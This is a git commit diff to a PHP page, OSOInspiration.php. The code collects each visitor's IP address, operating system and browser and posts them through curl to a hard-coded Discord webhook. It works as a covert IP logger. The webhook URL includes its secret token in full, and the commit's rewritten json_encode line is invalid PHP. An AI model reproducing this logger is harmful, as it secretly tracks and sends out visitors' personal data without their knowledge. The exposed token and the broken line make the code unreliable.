3cbb6a1335667038da0e866600d35fce59c88c62
Necis Orcus <jannick@vardevej.dk>
2020-12-01 15:03:52 +0100

    please work

--- OSOInspiration.php
+++ OSOInspiration.php
@@ -71,10 +71,8 @@ else{
 		$site = $site_refer;
 	}
 $time = date('Y-m-d H:i:s');
-$make_json = json_encode(array ('content'=>"OSOInspiration | $user_os | $user_browser | $time \n"));
-$json_data = json_encode([
-    "username" => "$ip",
-    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+$make_json = json_encode(array ('content'=>"OSOInspiration | $user_os | $user_browser | $time \n"),("username" => "$ip"));
+
 $exec = curl_init("https://discordapp.com/api/webhooks/783278384377102388/eRFWws-eeOKdRft9rz54bbX5_uoYa84-ViqU23zWB1QWtZvQcwNJayOnPPkDmFTL4WCY"); //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
